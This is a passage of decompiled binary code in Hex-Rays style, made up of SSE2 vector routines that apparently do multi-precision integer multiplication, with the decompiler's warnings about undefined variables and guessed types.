  v291 = _mm_add_epi32(_mm_unpackhi_epi64(v286, v284), _mm_srli_epi64(v289, 0x30u));
  v293 = _mm_load_si128(&v553);
  v294 = _mm_mul_epu32(_mm_load_si128(&v536), v293);
  v295 = _mm_mul_epu32(v293, v292[1]);
  v296 = _mm_load_si128(&stru_4BACE0);
  v297 = _mm_add_epi32(v291, _mm_and_si128(v296, v294));
  v298 = _mm_add_epi32(v290, _mm_srli_epi32(v294, 0x10u));
  v299 = _mm_and_si128(v296, v295);
  v300 = _mm_srli_epi32(v295, 0x10u);
  sub_4458ED();
  v301 = _mm_move_epi64(v299);
  v302 = _mm_move_epi64(v300);
  v303 = _mm_add_epi32(v297, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v299, v301), v301), 4));
  v304 = _mm_add_epi32(v298, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v300, v302), v302), 4));
  *(_DWORD *)(v305 + 136) = _mm_cvtsi128_si32(v303);
  v306 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v303), 0x10u), _mm_move_epi64(v304));
  v307 = _mm_unpackhi_epi64(v304, v301);
  *(_QWORD *)(v305 + 138) = v306.m128i_i64[0];
  v308 = _mm_add_epi32(_mm_unpackhi_epi64(v303, v301), _mm_srli_epi64(v306, 0x30u));
  v309 = _mm_load_si128(&v554);
  v310 = _mm_mul_epu32(_mm_load_si128(&v536), v309);
  v312 = _mm_mul_epu32(v309, *v311);
  v313 = _mm_load_si128(&stru_4BACE0);
  v314 = _mm_add_epi32(v308, _mm_and_si128(v313, v310));
  v315 = _mm_add_epi32(v307, _mm_srli_epi32(v310, 0x10u));
  v316 = _mm_and_si128(v313, v312);
  v317 = _mm_srli_epi32(v312, 0x10u);
  sub_44592A();
  v318 = _mm_move_epi64(v316);
  v319 = _mm_move_epi64(v317);
  v320 = _mm_add_epi32(v314, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v316, v318), v318), 4));
  v321 = _mm_add_epi32(v315, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v317, v319), v319), 4));
  *(_DWORD *)(v322 + 144) = _mm_cvtsi128_si32(v320);
  v323 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v320), 0x10u), _mm_move_epi64(v321));
  v324 = _mm_unpackhi_epi64(v321, v318);
  *(_QWORD *)(v322 + 146) = v323.m128i_i64[0];
  v325 = _mm_add_epi32(_mm_unpackhi_epi64(v320, v318), _mm_srli_epi64(v323, 0x30u));
  v327 = _mm_load_si128(&v554);
  v328 = _mm_mul_epu32(_mm_load_si128(&v537), v327);
  v329 = _mm_mul_epu32(v327, v326[1]);
  v330 = _mm_load_si128(&stru_4BACE0);
  v331 = _mm_add_epi32(v325, _mm_and_si128(v330, v328));
  v332 = _mm_add_epi32(v324, _mm_srli_epi32(v328, 0x10u));
  v333 = _mm_and_si128(v330, v329);
  v334 = _mm_srli_epi32(v329, 0x10u);
  sub_445967();
  v335 = _mm_move_epi64(v333);
  v336 = _mm_move_epi64(v334);
  v337 = _mm_add_epi32(v331, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v333, v335), v335), 4));
  v338 = _mm_add_epi32(v332, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v334, v336), v336), 4));
  *(_DWORD *)(v339 + 152) = _mm_cvtsi128_si32(v337);
  v340 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v337), 0x10u), _mm_move_epi64(v338));
  v341 = _mm_unpackhi_epi64(v338, v335);
  *(_QWORD *)(v339 + 154) = v340.m128i_i64[0];
  v342 = _mm_add_epi32(_mm_unpackhi_epi64(v337, v335), _mm_srli_epi64(v340, 0x30u));
  v343 = _mm_load_si128(&v555);
  v344 = _mm_mul_epu32(_mm_load_si128(&v537), v343);
  v346 = _mm_mul_epu32(v343, *v345);
  v347 = _mm_load_si128(&stru_4BACE0);
  v348 = _mm_add_epi32(v342, _mm_and_si128(v347, v344));
  v349 = _mm_add_epi32(v341, _mm_srli_epi32(v344, 0x10u));
  v350 = _mm_and_si128(v347, v346);
  v351 = _mm_srli_epi32(v346, 0x10u);
  sub_4459A4();
  v352 = _mm_move_epi64(v350);
  v353 = _mm_move_epi64(v351);
  v354 = _mm_add_epi32(v348, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v350, v352), v352), 4));
  v355 = _mm_add_epi32(v349, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v351, v353), v353), 4));
  *(_DWORD *)(v356 + 160) = _mm_cvtsi128_si32(v354);
  v357 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v354), 0x10u), _mm_move_epi64(v355));
  v358 = _mm_unpackhi_epi64(v355, v352);
  *(_QWORD *)(v356 + 162) = v357.m128i_i64[0];
  v359 = _mm_add_epi32(_mm_unpackhi_epi64(v354, v352), _mm_srli_epi64(v357, 0x30u));
  v361 = _mm_load_si128(&v555);
  v362 = _mm_mul_epu32(_mm_load_si128(&v538), v361);
  v363 = _mm_mul_epu32(v361, v360[1]);
  v364 = _mm_load_si128(&stru_4BACE0);
  v365 = _mm_add_epi32(v359, _mm_and_si128(v364, v362));
  v366 = _mm_add_epi32(v358, _mm_srli_epi32(v362, 0x10u));
  v367 = _mm_and_si128(v364, v363);
  v368 = _mm_srli_epi32(v363, 0x10u);
  sub_4459E1();
  v369 = _mm_move_epi64(v367);
  v370 = _mm_move_epi64(v368);
  v371 = _mm_add_epi32(v365, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v367, v369), v369), 4));
  v372 = _mm_add_epi32(v366, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v368, v370), v370), 4));
  *(_DWORD *)(v373 + 168) = _mm_cvtsi128_si32(v371);
  v374 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v371), 0x10u), _mm_move_epi64(v372));
  v375 = _mm_unpackhi_epi64(v372, v369);
  *(_QWORD *)(v373 + 170) = v374.m128i_i64[0];
  v376 = _mm_add_epi32(_mm_unpackhi_epi64(v371, v369), _mm_srli_epi64(v374, 0x30u));
  v377 = _mm_load_si128(&v556);
  v378 = _mm_mul_epu32(_mm_load_si128(&v538), v377);
  v380 = _mm_mul_epu32(v377, *v379);
  v381 = _mm_load_si128(&stru_4BACE0);
  v382 = _mm_add_epi32(v376, _mm_and_si128(v381, v378));
  v383 = _mm_add_epi32(v375, _mm_srli_epi32(v378, 0x10u));
  v384 = _mm_and_si128(v381, v380);
  v385 = _mm_srli_epi32(v380, 0x10u);
  sub_445A1E();
  v386 = _mm_move_epi64(v384);
  v387 = _mm_move_epi64(v385);
  v388 = _mm_add_epi32(v382, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v384, v386), v386), 4));
  v389 = _mm_add_epi32(v383, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v385, v387), v387), 4));
  *(_DWORD *)(v390 + 176) = _mm_cvtsi128_si32(v388);
  v391 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v388), 0x10u), _mm_move_epi64(v389));
  v392 = _mm_unpackhi_epi64(v389, v386);
  *(_QWORD *)(v390 + 178) = v391.m128i_i64[0];
  v393 = _mm_add_epi32(_mm_unpackhi_epi64(v388, v386), _mm_srli_epi64(v391, 0x30u));
  v395 = _mm_load_si128(&v556);
  v396 = _mm_mul_epu32(_mm_load_si128(&v539), v395);
  v397 = _mm_mul_epu32(v395, v394[1]);
  v398 = _mm_load_si128(&stru_4BACE0);
  v399 = _mm_add_epi32(v393, _mm_and_si128(v398, v396));
  v400 = _mm_add_epi32(v392, _mm_srli_epi32(v396, 0x10u));
  v401 = _mm_and_si128(v398, v397);
  v402 = _mm_srli_epi32(v397, 0x10u);
  sub_445A5B();
  v403 = _mm_move_epi64(v401);
  v404 = _mm_move_epi64(v402);
  v405 = _mm_add_epi32(v399, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v401, v403), v403), 4));
  v406 = _mm_add_epi32(v400, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v402, v404), v404), 4));
  *(_DWORD *)(v407 + 184) = _mm_cvtsi128_si32(v405);
  v408 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v405), 0x10u), _mm_move_epi64(v406));
  v409 = _mm_unpackhi_epi64(v406, v403);
  *(_QWORD *)(v407 + 186) = v408.m128i_i64[0];
  v410 = _mm_add_epi32(_mm_unpackhi_epi64(v405, v403), _mm_srli_epi64(v408, 0x30u));
  v411 = _mm_load_si128(&v557);
  v412 = _mm_mul_epu32(_mm_load_si128(&v539), v411);
  v414 = _mm_mul_epu32(v411, *v413);
  v415 = _mm_load_si128(&stru_4BACE0);
  v416 = _mm_add_epi32(v410, _mm_and_si128(v415, v412));
  v417 = _mm_add_epi32(v409, _mm_srli_epi32(v412, 0x10u));
  v418 = _mm_and_si128(v415, v414);
  v419 = _mm_srli_epi32(v414, 0x10u);
  sub_445A98();
  v420 = _mm_move_epi64(v418);
  v421 = _mm_move_epi64(v419);
  v422 = _mm_add_epi32(v416, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v418, v420), v420), 4));
  v423 = _mm_add_epi32(v417, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v419, v421), v421), 4));
  *(_DWORD *)(v424 + 192) = _mm_cvtsi128_si32(v422);
  v425 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v422), 0x10u), _mm_move_epi64(v423));
  v426 = _mm_unpackhi_epi64(v423, v420);
  *(_QWORD *)(v424 + 194) = v425.m128i_i64[0];
  v427 = _mm_add_epi32(_mm_unpackhi_epi64(v422, v420), _mm_srli_epi64(v425, 0x30u));
  v429 = _mm_load_si128(&v557);
  v430 = _mm_mul_epu32(_mm_load_si128(&v540), v429);
  v431 = _mm_mul_epu32(v429, v428[1]);
  v432 = _mm_load_si128(&stru_4BACE0);
  v433 = _mm_add_epi32(v427, _mm_and_si128(v432, v430));
  v434 = _mm_add_epi32(v426, _mm_srli_epi32(v430, 0x10u));
  v435 = _mm_and_si128(v432, v431);
  v436 = _mm_srli_epi32(v431, 0x10u);
  sub_445AD5();
  v437 = _mm_move_epi64(v435);
  v438 = _mm_move_epi64(v436);
  v439 = _mm_add_epi32(v433, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v435, v437), v437), 4));
  v440 = _mm_add_epi32(v434, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v436, v438), v438), 4));
  *(_DWORD *)(v441 + 200) = _mm_cvtsi128_si32(v439);
  v442 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v439), 0x10u), _mm_move_epi64(v440));
  v443 = _mm_unpackhi_epi64(v440, v437);
  *(_QWORD *)(v441 + 202) = v442.m128i_i64[0];
  v444 = _mm_add_epi32(_mm_unpackhi_epi64(v439, v437), _mm_srli_epi64(v442, 0x30u));
  v445 = _mm_load_si128(&v558);
  v446 = _mm_mul_epu32(_mm_load_si128(&v540), v445);
  v448 = _mm_mul_epu32(v445, *v447);
  v449 = _mm_load_si128(&stru_4BACE0);
  v450 = _mm_add_epi32(v444, _mm_and_si128(v449, v446));
  v451 = _mm_add_epi32(v443, _mm_srli_epi32(v446, 0x10u));
  v452 = _mm_and_si128(v449, v448);
  v453 = _mm_srli_epi32(v448, 0x10u);
  sub_445B12();
  v454 = _mm_move_epi64(v452);
  v455 = _mm_move_epi64(v453);
  v456 = _mm_add_epi32(v450, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v452, v454), v454), 4));
  v457 = _mm_add_epi32(v451, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v453, v455), v455), 4));
  *(_DWORD *)(v458 + 208) = _mm_cvtsi128_si32(v456);
  v459 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v456), 0x10u), _mm_move_epi64(v457));
  v460 = _mm_unpackhi_epi64(v457, v454);
  *(_QWORD *)(v458 + 210) = v459.m128i_i64[0];
  v461 = _mm_add_epi32(_mm_unpackhi_epi64(v456, v454), _mm_srli_epi64(v459, 0x30u));
  v463 = _mm_load_si128(&v558);
  v464 = _mm_mul_epu32(_mm_load_si128(&v541), v463);
  v465 = _mm_mul_epu32(v463, v462[1]);
  v466 = _mm_load_si128(&stru_4BACE0);
  v467 = _mm_add_epi32(v461, _mm_and_si128(v466, v464));
  v468 = _mm_add_epi32(v460, _mm_srli_epi32(v464, 0x10u));
  v469 = _mm_and_si128(v466, v465);
  v470 = _mm_srli_epi32(v465, 0x10u);
  sub_445B4F();
  v471 = _mm_move_epi64(v469);
  v472 = _mm_move_epi64(v470);
  v473 = _mm_add_epi32(v467, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v469, v471), v471), 4));
  v474 = _mm_add_epi32(v468, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v470, v472), v472), 4));
  *(_DWORD *)(v475 + 216) = _mm_cvtsi128_si32(v473);
  v476 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v473), 0x10u), _mm_move_epi64(v474));
  v477 = _mm_unpackhi_epi64(v474, v471);
  *(_QWORD *)(v475 + 218) = v476.m128i_i64[0];
  v478 = _mm_add_epi32(_mm_unpackhi_epi64(v473, v471), _mm_srli_epi64(v476, 0x30u));
  v479 = _mm_load_si128(&v559);
  v480 = _mm_mul_epu32(_mm_load_si128(&v541), v479);
  v482 = _mm_mul_epu32(v479, *v481);
  v483 = _mm_load_si128(&stru_4BACE0);
  v484 = _mm_add_epi32(v478, _mm_and_si128(v483, v480));
  v485 = _mm_add_epi32(v477, _mm_srli_epi32(v480, 0x10u));
  v486 = _mm_and_si128(v483, v482);
  v487 = _mm_srli_epi32(v482, 0x10u);
  sub_445B8C();
  v488 = _mm_move_epi64(v486);
  v489 = _mm_move_epi64(v487);
  v490 = _mm_add_epi32(v484, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v486, v488), v488), 4));
  v491 = _mm_add_epi32(v485, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v487, v489), v489), 4));
  *(_DWORD *)(v492 + 224) = _mm_cvtsi128_si32(v490);
  v493 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v490), 0x10u), _mm_move_epi64(v491));
  v494 = _mm_unpackhi_epi64(v491, v488);
  *(_QWORD *)(v492 + 226) = v493.m128i_i64[0];
  v495 = _mm_add_epi32(_mm_unpackhi_epi64(v490, v488), _mm_srli_epi64(v493, 0x30u));
  v497 = _mm_load_si128(&v559);
  v498 = _mm_mul_epu32(_mm_load_si128(&v542), v497);
  v499 = _mm_mul_epu32(v497, v496[1]);
  v500 = _mm_load_si128(&stru_4BACE0);
  v501 = _mm_add_epi32(v495, _mm_and_si128(v500, v498));
  v502 = _mm_add_epi32(v494, _mm_srli_epi32(v498, 0x10u));
  v503 = _mm_and_si128(v500, v499);
  v504 = _mm_srli_epi32(v499, 0x10u);
  sub_445BC9((int)&v542, &v559);
  v505 = _mm_move_epi64(v503);
  v506 = _mm_move_epi64(v504);
  v507 = _mm_add_epi32(v501, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v503, v505), v505), 4));
  v508 = _mm_add_epi32(v502, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v504, v506), v506), 4));
  *(_DWORD *)(v509 + 232) = _mm_cvtsi128_si32(v507);
  v510 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v507), 0x10u), _mm_move_epi64(v508));
  v511 = _mm_unpackhi_epi64(v508, v505);
  *(_QWORD *)(v509 + 234) = v510.m128i_i64[0];
  v512 = _mm_add_epi32(_mm_unpackhi_epi64(v507, v505), _mm_srli_epi64(v510, 0x30u));
  v513 = _mm_load_si128(&v560);
  v514 = _mm_mul_epu32(_mm_load_si128(&v542), v513);
  v516 = _mm_mul_epu32(v513, *v515);
  v517 = _mm_load_si128(&stru_4BACE0);
  v518 = _mm_and_si128(v517, v514);
  v519 = _mm_add_epi32(v511, _mm_srli_epi32(v514, 0x10u));
  v520 = _mm_and_si128(v517, v516);
  v521 = _mm_srli_epi32(v516, 0x10u);
  v522 = _mm_move_epi64(v520);
  v523 = _mm_move_epi64(v521);
  v524 = _mm_add_epi32(
           _mm_add_epi32(v512, v518),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v520, v522), v522), 4));
  v525 = _mm_add_epi32(v519, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v521, v523), v523), 4));
  *(_DWORD *)(v509 + 240) = _mm_cvtsi128_si32(v524);
  v526 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v524), 0x10u), _mm_move_epi64(v525));
  *(_QWORD *)(v509 + 242) = v526.m128i_i64[0];
  *(_QWORD *)(v509 + 248) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v524, v522), _mm_srli_epi64(v526, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v525, v522), 0x10u)).m128i_u64[0];
}
// 445CCB: variable 'v33' is possibly undefined
// 445D02: variable 'v39' is possibly undefined
// 445D5B: variable 'v50' is possibly undefined
// 445D82: variable 'v54' is possibly undefined
// 445DEE: variable 'v67' is possibly undefined
// 445E25: variable 'v73' is possibly undefined
// 445E7E: variable 'v84' is possibly undefined
// 445EA5: variable 'v88' is possibly undefined
// 445F11: variable 'v101' is possibly undefined
// 445F48: variable 'v107' is possibly undefined
// 445FA1: variable 'v118' is possibly undefined
// 445FC8: variable 'v122' is possibly undefined
// 446034: variable 'v135' is possibly undefined
// 44606B: variable 'v141' is possibly undefined
// 4460C4: variable 'v152' is possibly undefined
// 4460EB: variable 'v156' is possibly undefined
// 446157: variable 'v169' is possibly undefined
// 44618E: variable 'v175' is possibly undefined
// 4461E7: variable 'v186' is possibly undefined
// 44620E: variable 'v190' is possibly undefined
// 44627A: variable 'v203' is possibly undefined
// 4462B1: variable 'v209' is possibly undefined
// 44630A: variable 'v220' is possibly undefined
// 446331: variable 'v224' is possibly undefined
// 44639D: variable 'v237' is possibly undefined
// 4463D4: variable 'v243' is possibly undefined
// 44642D: variable 'v254' is possibly undefined
// 446454: variable 'v258' is possibly undefined
// 4464C0: variable 'v271' is possibly undefined
// 4464F7: variable 'v277' is possibly undefined
// 446550: variable 'v288' is possibly undefined
// 44657D: variable 'v292' is possibly undefined
// 4465E9: variable 'v305' is possibly undefined
// 446626: variable 'v311' is possibly undefined
// 44667F: variable 'v322' is possibly undefined
// 4466AC: variable 'v326' is possibly undefined
// 446718: variable 'v339' is possibly undefined
// 446755: variable 'v345' is possibly undefined
// 4467AE: variable 'v356' is possibly undefined
// 4467DB: variable 'v360' is possibly undefined
// 446847: variable 'v373' is possibly undefined
// 446884: variable 'v379' is possibly undefined
// 4468DD: variable 'v390' is possibly undefined
// 44690A: variable 'v394' is possibly undefined
// 446976: variable 'v407' is possibly undefined
// 4469B3: variable 'v413' is possibly undefined
// 446A0C: variable 'v424' is possibly undefined
// 446A39: variable 'v428' is possibly undefined
// 446AA5: variable 'v441' is possibly undefined
// 446AE2: variable 'v447' is possibly undefined
// 446B3B: variable 'v458' is possibly undefined
// 446B68: variable 'v462' is possibly undefined
// 446BD4: variable 'v475' is possibly undefined
// 446C11: variable 'v481' is possibly undefined
// 446C6A: variable 'v492' is possibly undefined
// 446C97: variable 'v496' is possibly undefined
// 446D03: variable 'v509' is possibly undefined
// 446D3E: variable 'v515' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 4457B0: using guessed type __m128i anonymous_27;

//----- (00445870) --------------------------------------------------------
int sub_445870()
{
  return sub_4458B0();
}
// 4458B0: using guessed type int sub_4458B0(void);

//----- (004458B0) --------------------------------------------------------
int sub_4458B0()
{
  return sub_4458ED();
}
// 4458ED: using guessed type int sub_4458ED(void);

//----- (004458ED) --------------------------------------------------------
int sub_4458ED()
{
  return sub_44592A();
}
// 44592A: using guessed type int sub_44592A(void);

//----- (0044592A) --------------------------------------------------------
int sub_44592A()
{
  return sub_445967();
}
// 445967: using guessed type int sub_445967(void);

//----- (00445967) --------------------------------------------------------
int sub_445967()
{
  return sub_4459A4();
}
// 4459A4: using guessed type int sub_4459A4(void);

//----- (004459A4) --------------------------------------------------------
int sub_4459A4()
{
  return sub_4459E1();
}
// 4459E1: using guessed type int sub_4459E1(void);

//----- (004459E1) --------------------------------------------------------
int sub_4459E1()
{
  return sub_445A1E();
}
// 445A1E: using guessed type int sub_445A1E(void);

//----- (00445A1E) --------------------------------------------------------
int sub_445A1E()
{
  return sub_445A5B();
}
// 445A5B: using guessed type int sub_445A5B(void);

//----- (00445A5B) --------------------------------------------------------
int sub_445A5B()
{
  return sub_445A98();
}
// 445A98: using guessed type int sub_445A98(void);

//----- (00445A98) --------------------------------------------------------
int sub_445A98()
{
  return sub_445AD5();
}
// 445AD5: using guessed type int sub_445AD5(void);

//----- (00445AD5) --------------------------------------------------------
int sub_445AD5()
{
  return sub_445B12();
}
// 445B12: using guessed type int sub_445B12(void);

//----- (00445B12) --------------------------------------------------------
int sub_445B12()
{
  return sub_445B4F();
}
// 445B4F: using guessed type int sub_445B4F(void);

//----- (00445B4F) --------------------------------------------------------
int sub_445B4F()
{
  return sub_445B8C();
}
// 445B8C: using guessed type int sub_445B8C(void);

//----- (00445B8C) --------------------------------------------------------
int sub_445B8C()
{
  return sub_445BC9();
}
// 445BC9: using guessed type int sub_445BC9(void);

//----- (00445BC9) --------------------------------------------------------
__m128i __usercall sub_445BC9@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00446DE0) --------------------------------------------------------
void __cdecl sub_446DE0(int a1, int a2, int a3)
{
  int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm2
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
  __m128i v47; // xmm1
  __m128i v48; // xmm4
  __m128i v49; // xmm5
  __m128i v50; // xmm6
  __m128i v51; // [esp+10h] [ebp-6Ch] BYREF
  __m128i v52; // [esp+20h] [ebp-5Ch] BYREF
  __m128i v53; // [esp+30h] [ebp-4Ch]
  __m128i v54; // [esp+40h] [ebp-3Ch]
  __m128i v55; // [esp+50h] [ebp-2Ch] BYREF
  __m128i v56; // [esp+60h] [ebp-1Ch] BYREF

  for ( i = 0; i != 16; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i), 216);
    *(__m128i *)((char *)&v51 + 2 * i) = v4;
    *(__m128i *)((char *)&v52 + 2 * i) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v53 + 2 * i) = v5;
    *(__m128i *)((char *)&v54 + 2 * i) = _mm_srli_epi64(v5, 0x20u);
    *(__m128i *)((char *)&v55 + 2 * i) = v6;
    *(__m128i *)((char *)&v56 + 2 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v55);
  v8 = _mm_mul_epu32(_mm_load_si128(&v51), v7);
  si128 = _mm_load_si128(&stru_4BACE0);
  v10 = _mm_and_si128(si128, v8);
  v11 = _mm_mul_epu32(v7, v53);
  v12 = _mm_and_si128(si128, v11);
  v13 = _mm_srli_epi32(v11, 0x10u);
  v14 = _mm_move_epi64(v12);
  v15 = _mm_move_epi64(v13);
  v16 = _mm_add_epi32(v10, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  v17 = _mm_add_epi32(_mm_srli_epi32(v8, 0x10u), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  *(_DWORD *)a1 = _mm_cvtsi128_si32(v16);
  v18 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v16), 0x10u), _mm_move_epi64(v17));
  v19 = _mm_unpackhi_epi64(v17, v14);
  *(_QWORD *)(a1 + 2) = v18.m128i_i64[0];
  v20 = _mm_add_epi32(_mm_unpackhi_epi64(v16, v14), _mm_srli_epi64(v18, 0x30u));
  v21 = _mm_load_si128(&v55);
  v22 = _mm_mul_epu32(_mm_load_si128(&v52), v21);
  v23 = _mm_mul_epu32(v21, v54);
  v24 = _mm_load_si128(&stru_4BACE0);
  v25 = _mm_add_epi32(v20, _mm_and_si128(v24, v22));
  v26 = _mm_add_epi32(v19, _mm_srli_epi32(v22, 0x10u));
  v27 = _mm_and_si128(v24, v23);
  v28 = _mm_srli_epi32(v23, 0x10u);
  sub_446E85((int)&v52, &v55);
  v29 = _mm_move_epi64(v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_add_epi32(v25, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v27, v29), v29), 4));
  v32 = _mm_add_epi32(v26, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  *(_DWORD *)(v33 + 8) = _mm_cvtsi128_si32(v31);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v31), 0x10u), _mm_move_epi64(v32));
  v35 = _mm_unpackhi_epi64(v32, v29);
  *(_QWORD *)(v33 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v31, v29), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v56);
  v38 = _mm_mul_epu32(_mm_load_si128(&v52), v37);
  v40 = _mm_mul_epu32(v37, *v39);
  v41 = _mm_load_si128(&stru_4BACE0);
  v42 = _mm_and_si128(v41, v38);
  v43 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v44 = _mm_and_si128(v41, v40);
  v45 = _mm_srli_epi32(v40, 0x10u);
  v46 = _mm_move_epi64(v44);
  v47 = _mm_move_epi64(v45);
  v48 = _mm_add_epi32(_mm_add_epi32(v36, v42), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  v49 = _mm_add_epi32(v43, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v45, v47), v47), 4));
  *(_DWORD *)(v33 + 16) = _mm_cvtsi128_si32(v48);
  v50 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v48), 0x10u), _mm_move_epi64(v49));
  *(_QWORD *)(v33 + 18) = v50.m128i_i64[0];
  *(_QWORD *)(v33 + 24) = _mm_add_epi64(
                            _mm_add_epi32(_mm_unpackhi_epi64(v48, v46), _mm_srli_epi64(v50, 0x30u)),
                            _mm_slli_epi64(_mm_unpackhi_epi64(v49, v46), 0x10u)).m128i_u64[0];
}
// 446F87: variable 'v33' is possibly undefined
// 446FBC: variable 'v39' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;
// 446DE0: using guessed type __m128i var_1C;

//----- (00446E85) --------------------------------------------------------
__m128i __usercall sub_446E85@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (00447050) --------------------------------------------------------
void __cdecl sub_447050(int a1, int a2, int a3)
{
  unsigned int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm5
  __m128i si128; // xmm6
  __m128i v10; // xmm4
  __m128i v11; // xmm7
  __m128i v12; // xmm6
  __m128i v13; // xmm7
  __m128i v14; // xmm0
  __m128i v15; // xmm1
  __m128i v16; // xmm4
  __m128i v17; // xmm5
  __m128i v18; // xmm6
  __m128i v19; // xmm5
  __m128i v20; // xmm4
  __m128i v21; // xmm7
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm4
  __m128i v26; // xmm5
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm0
  __m128i v30; // xmm1
  __m128i v31; // xmm4
  __m128i v32; // xmm5
  int v33; // ecx
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i *v39; // edx
  __m128i v40; // xmm7
  __m128i v41; // xmm6
  __m128i v42; // xmm4
  __m128i v43; // xmm5
  __m128i v44; // xmm6
  __m128i v45; // xmm7
  __m128i v46; // xmm0
